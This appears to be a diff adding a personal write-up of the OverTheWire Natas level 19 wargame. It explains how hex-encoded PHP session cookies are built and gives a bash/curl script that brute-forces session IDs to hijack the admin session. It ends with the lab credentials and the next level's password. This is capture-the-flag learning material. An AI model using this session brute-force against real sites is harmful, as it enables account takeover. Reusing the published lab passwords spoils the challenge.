@@ -1,0 +1,64 @@
+This lab is similar to the last one but you are told that the cookies are in a
+non-sequential order which isn't really true. After trying some input and
+getting the following cookie combinations:
+
+username, password, cookie
+
+,,3435332d
+,,35362d
+,,3238392d
+,a,3236332d
+,a,3230372d
+,b,3536362d
+admin,,3535332d61646d696e
+admin,a,3631332d61646d696e
+admin,b,3631302d61646d696e
+admin,c,3235342d61646d696e
+admin,aa,3332352d61646d696e
+admin,ab,3433352d61646d696e
+admin,ac,3533332d61646d696e
+admin,admin,3330382d61646d696e
+someotheruser,,3431312d736f6d656f7468657275736572
+someotheruser,badpassword,3632382d736f6d656f7468657275736572
+markzuckerberg,,3136322d6d61726b7a75636b657262657267
+markzuckerberg,thezucc,3235342d6d61726b7a75636b657262657267
+Sae5ieJoh"Ke5eey,,3232322d5361653569654a6f68224b6535656579
+Sae5ieJoh"Ke5eey,,3438362d5361653569654a6f68224b6535656579
+Sae5ieJoh"Ke5eey,,3238362d5361653569654a6f68224b6535656579
+Sae5ieJoh"Ke5eey,,3337362d5361653569654a6f68224b6535656579
+Sae5ieJoh"Ke5eey,,3536382d5361653569654a6f68224b6535656579
+ayei5Achei<g3Fee,,3136342d617965693541636865693c6733466565
+
+I determined that you have a 3 followed by a random 1-5 digit number then 2d and
+then the username in hex...
+
+This lead me down the wrong rabbit hole. I tried brute forcing with curl
+commands and a random 1-5 digit number which has 100k possible combinations. To
+make things worse I was executing my bash variable wrong. As you'll see in my
+code: output=`eval $command` is the proper way to execute a multi-word
+variable. Not `$command` or `"$command"` as I was doing before. Just simply
+using python3 would have averted this misunderstanding but I'm glad I know now.
+
+Here is the link I used for help:
+
+https://floatingbytes.blogspot.com/2014/10/wargames-natas-19.html
+
+Here is my code:
+
+#!/bin/bash
+
+for((i=0;i<641;i++))
+do
+    cookie=`echo -n "$i-admin" | xxd -p`
+    command="curl --silent -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs --cookie 'PHPSESSID=$cookie' 'http://natas19.natas.labs.overthewire.org'"
+    output=`eval $command`
+    echo "curl #$i"
+    match=`echo "$output" | grep -cE "You are an admin."`
+    if [[ $match -ne 0 ]]
+    then
+	echo "$output"
+	break
+    fi
+done
+
+natas20 password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
